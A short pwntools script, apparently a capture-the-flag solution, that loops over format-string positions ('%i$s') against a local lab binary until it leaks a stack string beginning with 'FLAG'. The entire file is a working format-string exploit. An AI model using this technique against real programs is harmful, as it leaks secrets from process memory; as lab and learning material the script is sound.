from pwn import *

context.binary = binary = ELF("./format-string", checksec=False)
context.log_level = "CRITICAL"

# Brute force the flag on the stack
for i in range(1, 200):
    # Define the payload with the position value (i)
    payload = f"%{i}$s"

    # Start the process
    p = binary.process()
    # Send he payload after prompted for input
    p.sendlineafter(b"Enter your input:", payload.encode())
    # Get the output (leaked value)
    leaked = p.recvallS().strip()
    # If the leaked value starts with "FLAG", that's the flag
    if leaked.startswith("FLAG"):
        print(leaked)
        p.close()
        break

    else:
        p.close()
